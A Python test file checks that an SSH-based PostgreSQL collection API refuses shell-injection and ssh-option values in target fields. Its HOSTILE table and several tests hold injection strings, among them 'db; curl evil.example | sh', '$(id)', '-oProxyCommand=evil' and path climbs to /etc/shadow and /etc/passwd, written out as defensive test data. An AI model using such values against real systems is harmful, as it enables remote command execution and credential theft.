"""The shape checks on a live collection's target, applied to submit.

The SSH target, user, key name and password file go onto an `ssh` command line, and the
database host, port, database name and password file go into a command run on the database
host. So a value that can end that command, or be read as an option, is refused: at the API
(422, before any job exists), in preflight, and in collect() where the command is built.
Spec: .kiro/specs/ssh-collection (SSH-5).
"""
import pytest
from fastapi.testclient import TestClient

from src.agents.collector import postgres_collector
from src.agents.collector.postgres_collector import collect
from src.agents.collector.target_checks import target_problems
from src.api import common
from src.api.main import app
from src.api.routes import assessments
from src.contracts.collector_input import CollectorInput
from src.contracts.regions import valid_region

PREFIX = "/api/v1"
GOOD_LIVE = {"ssh_target": "ec2-user@db-host.example.internal", "db_user": "apcat_ro",
             "password_file": "/home/ec2-user/.apcat-db-password"}  # nosec B105 - test value, not a password


def payload(**over) -> dict:
    body = {
        "job_id": "live-1", "cluster_endpoint": "127.0.0.1", "port": 5432,
        "database_name": "appdb", "mode": "live", "live_config": dict(GOOD_LIVE),
        "collection_options": {"window_minutes": 15},
    }
    body.update(over)
    return body


def inp(**over) -> CollectorInput:
    return CollectorInput.model_validate(payload(**over))


def live(**over) -> dict:
    return {**GOOD_LIVE, **over}


# Each of these would be run as shell, or change what is run, or be read as an ssh option.
HOSTILE = {
    "endpoint with a command": {"cluster_endpoint": "db; curl evil.example | sh"},
    "endpoint with a substitution": {"cluster_endpoint": "$(id)"},
    "endpoint with a backtick": {"cluster_endpoint": "`id`"},
    "endpoint with a quote": {"cluster_endpoint": "db'x"},
    "endpoint with a trailing newline": {"cluster_endpoint": "db.example.internal\n"},
    "endpoint that is an option": {"cluster_endpoint": "-h evil"},
    "database with a space": {"database_name": "app db"},
    "database with a dollar": {"database_name": "$HOME"},
    "database with a trailing newline": {"database_name": "appdb\n"},
    "database with an embedded newline": {"database_name": "app\nid"},
    "ssh target that is an ssh option": {"live_config": live(ssh_target="-oProxyCommand=evil")},
    "ssh target with a command": {"live_config": live(ssh_target="host; curl evil.example")},
    "ssh target with a space": {"live_config": live(ssh_target="ec2-user@a b")},
    "ssh target with a trailing newline": {"live_config": live(ssh_target="host\n")},
    "ssh target with a substitution": {"live_config": live(ssh_target="$(id)@host")},
    "user with a quote": {"live_config": live(db_user="a'b")},
    "user with a semicolon": {"live_config": live(db_user="a;b")},
    "user with a trailing newline": {"live_config": live(db_user="apcat\n")},
    "password file that is relative": {"live_config": live(password_file="pw")},  # nosec B106 - test value, not a password
    "password file that climbs": {"live_config": live(password_file="/a/../etc/shadow")},  # nosec B106 - test value, not a password
    "password file with a command": {"live_config": live(password_file="/a; id")},  # nosec B106 - test value, not a password
    "password file with a trailing newline": {"live_config": live(password_file="/a/pw\n")},  # nosec B106 - test value, not a password
    "key that is a path": {"live_config": live(identity_file="../../etc/passwd")},
    "key that is hidden": {"live_config": live(identity_file=".ssh")},
    "key that is an option": {"live_config": live(identity_file="-oX=y")},
    "port out of range": {"port": 70000},
}


@pytest.fixture
def client(tmp_path, monkeypatch) -> TestClient:
    monkeypatch.setattr(common, "ARTIFACT_ROOT", str(tmp_path))
    return TestClient(app, client=("127.0.0.1", 50000))


@pytest.fixture
def ran(monkeypatch) -> list:
    """Records every job the API starts. It must stay empty when a value is refused."""
    calls: list = []

    class Spy:
        def get_state(self, job_id):
            return {"status": "not_found"}

        def run_job(self, job_id, body):
            calls.append(job_id)

    monkeypatch.setattr(assessments, "orchestrator", lambda *a, **k: Spy())
    return calls


# ---------------------------------------------------------------------------
# Submit
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("over", HOSTILE.values(), ids=HOSTILE.keys())
def test_submit_refuses_a_value_that_could_reach_a_shell(client, ran, tmp_path, over):
    r = client.post(f"{PREFIX}/assessments", json=payload(**over))
    assert r.status_code == 422, r.text
    assert ran == []  # nothing was queued or run
    assert list(tmp_path.iterdir()) == []  # not even a job record
    for fragment in ("evil", "$(id)", "`id`", "curl", "HOME", "etc/shadow", "passwd"):
        assert fragment not in r.text  # the refusal does not echo the value back


def test_the_refusal_names_the_field(client, ran):
    r = client.post(f"{PREFIX}/assessments", json=payload(
        cluster_endpoint="db; id", database_name="app db"))
    detail = r.json()["detail"]
    assert "cluster_endpoint" in detail and "database_name" in detail


@pytest.mark.parametrize("over", [
    {}, {"cluster_endpoint": "10.0.1.50"}, {"cluster_endpoint": "fd00::5"},
    {"cluster_endpoint": "localhost"},
    {"database_name": "orders_v2.prod-1"},
    {"live_config": live(ssh_target="db1")},
    {"live_config": live(ssh_target="my_alias")},
    {"live_config": live(ssh_target="ubuntu@10.0.1.50", ssh_port=2222)},
    {"live_config": live(identity_file="apcat_ed25519")},
    {"live_config": live(db_user="retail_admin")},
])
def test_submit_still_accepts_ordinary_targets(client, ran, over):
    r = client.post(f"{PREFIX}/assessments", json=payload(**over))
    assert r.status_code == 200, r.text
    assert r.json()["status"] == "queued" and ran == ["live-1"]


def test_a_refused_submit_does_not_use_up_the_job_id(client, ran):
    assert client.post(f"{PREFIX}/assessments",
                       json=payload(cluster_endpoint="db; id")).status_code == 422
    assert client.post(f"{PREFIX}/assessments", json=payload()).status_code == 200


def test_submit_and_preflight_agree(client, ran):
    """They apply the same function, so they accept and refuse the same inputs."""
    for over in HOSTILE.values():
        a = client.post(f"{PREFIX}/assessments", json=payload(**over)).status_code
        b = client.post(f"{PREFIX}/assessments/preflight", json=payload(**over)).status_code
        assert a == b == 422


def test_a_region_with_a_trailing_newline_is_refused_by_the_routes_too(client, ran, tmp_path):
    body = {"collector_output": {}, "region": "us-east-1\n"}
    assert client.post(f"{PREFIX}/assessments/from-collection", json=body).status_code == 422
    assert client.post(f"{PREFIX}/assessments", params={"region": "us-east-1\n"},
                       json=payload()).status_code == 422
    assert list(tmp_path.iterdir()) == []


@pytest.mark.parametrize("extra", [
    {"secret_arn": "x"}, {"automation_instance_id": "i-0123456789abcdef0"},  # nosec B105 - test value, not a password
    {"password": "inline-password"}, {"unknown": 1},  # nosec B105 - test value, not a password
])
def test_live_config_takes_no_other_fields(client, ran, extra):
    """No password in a request, and no field of the old access method."""
    r = client.post(f"{PREFIX}/assessments", json=payload(live_config=live(**extra)))
    assert r.status_code == 422 and ran == []
    assert "inline-password" not in r.text


def test_the_top_level_takes_no_aws_block(client, ran):
    body = payload()
    body["aws_config"] = {"region": "us-east-1"}
    assert client.post(f"{PREFIX}/assessments", json=body).status_code == 422
    assert ran == []


# ---------------------------------------------------------------------------
# Where the command is built
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("over", HOSTILE.values(), ids=HOSTILE.keys())
def test_collect_refuses_the_same_values_before_it_connects(monkeypatch, over):
    def refuse(*_a, **_k):
        raise AssertionError("nothing may be built for a refused target")

    monkeypatch.setattr(postgres_collector, "SshPsqlExecutor", refuse)
    with pytest.raises(ValueError, match="Invalid collection target"):
        collect(inp(**over))


def test_collect_leaves_an_injected_executor_alone(monkeypatch):
    """A script that builds its own executor (local, or SSH with its own values) is not checked."""
    seen = []
    monkeypatch.setattr(postgres_collector, "target_problems",
                        lambda i: seen.append(i) or ["would refuse"])

    class Empty:
        def run_sql_json(self, **_kw):
            raise RuntimeError("stop here")

        run_sql = run_command = run_sql_json

    try:
        collect(inp(), executor=Empty())
    except ValueError as e:  # pragma: no cover - the failure this test exists to catch
        pytest.fail(f"an injected executor must not be checked: {e}")
    except Exception:  # noqa: BLE001 - whatever the empty executor does later is not the point
        pass
    assert seen == []


def test_a_failed_live_job_records_the_field_not_the_value(tmp_path):
    from src.orchestrator.local_orchestrator import LocalOrchestrator
    orch = LocalOrchestrator(str(tmp_path), price=False)
    with pytest.raises(ValueError):
        orch.run_job("job-bad", payload(cluster_endpoint="db; curl evil.example | sh"))
    st = orch.get_state("job-bad")
    assert st["status"] == "failed" and "cluster_endpoint" in st["error"]
    assert "evil" not in st["error"] and "curl" not in st["error"]
    assert [p["phase"] for p in st["phases"]] == ["collect"]


# ---------------------------------------------------------------------------
# The helpers
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("region,ok", [
    ("us-east-1", True), ("ap-southeast-2", True), ("us-gov-west-1", True),
    ("us-east-1\n", False), ("us-east-1 ", False), ("", False), ("US-EAST-1", False),
    ("us-east-1; id", False), (None, False), ("x" * 40, False),
])
def test_valid_region_refuses_a_trailing_newline(region, ok):
    assert valid_region(region) is ok


def test_every_problem_names_a_field_and_none_echoes_a_value():
    bad = inp(cluster_endpoint="evil; id", database_name="bad name",
              live_config=live(ssh_target="evil host", db_user="bad;user",
                               password_file="rel/pw", identity_file="../k"))  # nosec B106 - test value, not a password
    problems = target_problems(bad)
    assert len(problems) == 6
    text = " ".join(problems)
    for value in ("evil", "bad name", "bad;user", "rel/pw", "../k"):
        assert value not in text
    for field in ("cluster_endpoint", "database_name", "ssh_target", "db_user",
                  "password_file", "identity_file"):
        assert field in text
